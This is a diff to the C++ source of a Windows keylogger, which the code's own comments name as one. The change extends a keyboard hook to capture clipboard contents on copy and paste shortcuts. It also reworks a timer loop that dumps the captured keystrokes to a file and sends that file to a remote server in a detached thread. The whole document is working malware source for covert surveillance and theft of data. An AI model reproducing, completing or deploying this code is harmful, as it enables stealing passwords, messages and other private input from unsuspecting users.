@@ -106,8 +106,8 @@ static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 		int vkCode = pKeyboardStruct->vkCode;
 		std::string message("");
 
-		// checking CTRL + V
-		if (isCtrlPressed && vkCode == VK_V)
+		// checking CTRL + C or CTRL + V, and SHIFT + F10 because with that you can simulate the mouse right click, then copy
+		if ((isCtrlPressed && (vkCode == VK_V || vkCode == VK_C)) || (isShiftPressed && VK_F10))
 		{
 			// checking if the clipboard is open
 			if (OpenClipboard(NULL))
@@ -120,10 +120,10 @@ static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 					char* text = static_cast<char*>(GlobalLock(hData));
 					if (text != NULL)
 					{
-						message.append("\n--- CTRL + V ---\n");
+						message.append("\n--- CTRL + (C/V) ---\n");
 						message.append(text);
 						clipBoardLastSave = text;
-						message.append("\n--/FINE -> CTRL + V*\\--\n");
+						message.append("\n--/FINE -> CTRL + (C/V)\\--\n");
 						// unlocking the clipboard
 						GlobalUnlock(hData);
 					}
@@ -627,15 +627,14 @@ static void timeCheck() {
 		// Wait x minutes
 		std::this_thread::sleep_for(waitTime);
 		tmp = contentFile;
-		contentFile = "";
+		// resetting the contentFile
+		contentFile = StartString();
 		std::ofstream outputFile(FilePath);
-		!(outputFile.is_open()) ?: outputFile << tmp;
-		outputFile.close();
-		// sending the file to the server
+		!(outputFile.is_open()) ?: (outputFile << tmp, outputFile.close(), tmp = "");
+		// sending the file to the server, and remove it into the thread
 		std::thread tSend(makeRequest);
+		// detach the thread from the execution, so I can send the file without stopping the keylogger
 		tSend.detach();
-		// here I check if meanwhile that I have sent the mail, the user has typed some more keys
-		(contentFile != "") ? (tmp = StartString() + contentFile, contentFile = tmp) : (contentFile = StartString());
 	}
 }
 
